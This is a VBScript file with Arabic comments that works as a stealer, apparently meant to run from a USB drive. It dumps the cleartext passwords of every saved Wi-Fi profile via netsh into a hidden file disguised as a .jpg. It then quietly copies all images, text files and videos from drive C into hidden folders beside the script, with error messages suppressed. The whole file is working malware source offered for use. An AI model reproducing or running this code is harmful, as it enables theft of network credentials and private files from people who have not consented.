On Error Resume Next

Dim objFSO, objFolder, objFile, objShell
Dim strImageFolderPath, strTextFolderPath, strVideoFolderPath
Dim strBaseImageFolderPath, strBaseTextFolderPath, strBaseVideoFolderPath
Dim intCounter, strFolderPath, strCemFolder, strFilePath, i
Dim currentSSID, interfaces, profiles, profileDetails, ssid

' إنشاء كائن نظام الملفات
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' تحديد مسار المجلدات الأساسية
strFolderPath = objFSO.GetParentFolderName(WScript.ScriptFullName)
strBaseImageFolderPath = strFolderPath & "\MovedImages"
strBaseTextFolderPath = strFolderPath & "\MovedTextFiles"
strBaseVideoFolderPath = strFolderPath & "\MovedVideos"
strCemFolder = strFolderPath & "\cem"

' التحقق من وجود المجلدات الناتجة، وإنشاؤها إذا لم تكن موجودة
intCounter = 1
strImageFolderPath = strBaseImageFolderPath
Do While objFSO.FolderExists(strImageFolderPath)
    strImageFolderPath = strBaseImageFolderPath & "_" & intCounter
    intCounter = intCounter + 1
Loop
objFSO.CreateFolder(strImageFolderPath)
objShell.Run "attrib +h " & strImageFolderPath, 0, True

intCounter = 1
strTextFolderPath = strBaseTextFolderPath
Do While objFSO.FolderExists(strTextFolderPath)
    strTextFolderPath = strBaseTextFolderPath & "_" & intCounter
    intCounter = intCounter + 1
Loop
objFSO.CreateFolder(strTextFolderPath)
objShell.Run "attrib +h " & strTextFolderPath, 0, True

intCounter = 1
strVideoFolderPath = strBaseVideoFolderPath
Do While objFSO.FolderExists(strVideoFolderPath)
    strVideoFolderPath = strBaseVideoFolderPath & "_" & intCounter
    intCounter = intCounter + 1
Loop
objFSO.CreateFolder(strVideoFolderPath)
objShell.Run "attrib +h " & strVideoFolderPath, 0, True

' التحقق من وجود المجلد "cem"، وإنشاءه إذا لم يكن موجودًا
If Not objFSO.FolderExists(strCemFolder) Then
    objFSO.CreateFolder(strCemFolder)
End If
objShell.Run "attrib +h " & strCemFolder, 0, True

' تحديد مسار الملف داخل المجلد "cem"
strFilePath = strCemFolder & "\soll.jpg"
i = 1
Do While objFSO.FileExists(strFilePath)
    strFilePath = strCemFolder & "\sool_" & i & ".jpg"
    i = i + 1
Loop

' إنشاء ملف نصي لحفظ تفاصيل الشبكات
Set objFile = objFSO.CreateTextFile(strFilePath, True)

' استخراج معلومات الشبكة المتصلة حاليًا
Set objExec = objShell.Exec("netsh wlan show interfaces")
interfaces = objExec.StdOut.ReadAll()
currentSSID = ""
For Each line In Split(interfaces, vbCrLf)
    If InStr(line, "SSID") > 0 And InStr(line, "BSSID") = 0 Then
        currentSSID = Trim(Mid(line, InStr(line, ":") + 1))
        Exit For
    End If
Next

' إذا كانت هناك شبكة متصلة، استخراج تفاصيلها أولاً
If currentSSID <> "" Then
    objFile.WriteLine("Current Connected SSID: " & currentSSID)
    Set objExecProfile = objShell.Exec("netsh wlan show profile name=""" & currentSSID & """ key=clear")
    profileDetails = objExecProfile.StdOut.ReadAll()
    objFile.WriteLine(profileDetails)
    objFile.WriteLine("--------------------------------------------------")
    objFile.WriteLine()
    objFile.WriteLine()
    objFile.WriteLine()
    objFile.WriteLine()
End If

' تنفيذ الأمر لعرض جميع ملفات تعريف Wi-Fi المحفوظة
Set objExec = objShell.Exec("netsh wlan show profiles")
profiles = objExec.StdOut.ReadAll()

' معالجة كل ملف تعريف
For Each line In Split(profiles, vbCrLf)
    If InStr(line, "Profil Tous les utilisateurs") > 0 Or InStr(line, "All User Profile") > 0 Then
        ssid = Trim(Mid(line, InStr(line, ":") + 1))
        If ssid <> currentSSID Then
            objFile.WriteLine("SSID: " & ssid)
            ' تنفيذ الأمر لعرض تفاصيل الملف الشخصي
            Set objExecProfile = objShell.Exec("netsh wlan show profile name=""" & ssid & """ key=clear")
            profileDetails = objExecProfile.StdOut.ReadAll()
            objFile.WriteLine(profileDetails)
            objFile.WriteLine("--------------------------------------------------")
        End If
    End If
Next

objFile.Close
objShell.Run "attrib +h " & strFilePath, 0, True

' استدعاء الدالة لنقل الصور والملفات النصية والفيديوهات من مجلدات المستخدم
Call CopyFiles(objFSO.GetFolder("C:\"))

' دالة لنقل الصور والملفات النصية والفيديوهات
Sub CopyFiles(objFolder)
    On Error Resume Next
    For Each objFile In objFolder.Files
        If LCase(objFSO.GetExtensionName(objFile.Name)) = "jpg" Or LCase(objFSO.GetExtensionName(objFile.Name)) = "png" Or LCase(objFSO.GetExtensionName(objFile.Name)) = "jpeg" Then
            objFile.Copy strImageFolderPath & "\" & objFile.Name, True
        ElseIf LCase(objFSO.GetExtensionName(objFile.Name)) = "txt" Then
            objFile.Copy strTextFolderPath & "\" & objFile.Name, True
        ElseIf LCase(objFSO.GetExtensionName(objFile.Name)) = "mp4" Or LCase(objFSO.GetExtensionName(objFile.Name)) = "avi" Or LCase(objFSO.GetExtensionName(objFile.Name)) = "mkv" Then
            objFile.Copy strVideoFolderPath & "\" & objFile.Name, True
        End If
    Next
    For Each objSubFolder In objFolder.SubFolders
        ' تجنب مجلدات النظام والبرامج
        If InStr(LCase(objSubFolder.Path), "windows") = 0 And InStr(LCase(objSubFolder.Path), "program files") = 0 And InStr(LCase(objSubFolder.Path), "program files (x86)") = 0 And InStr(LCase(objSubFolder.Path), "programdata") = 0 And InStr(LCase(objSubFolder.Path), "appdata") = 0 Then
            CopyFiles objSubFolder
        End If
    Next
    On Error GoTo 0
End Sub
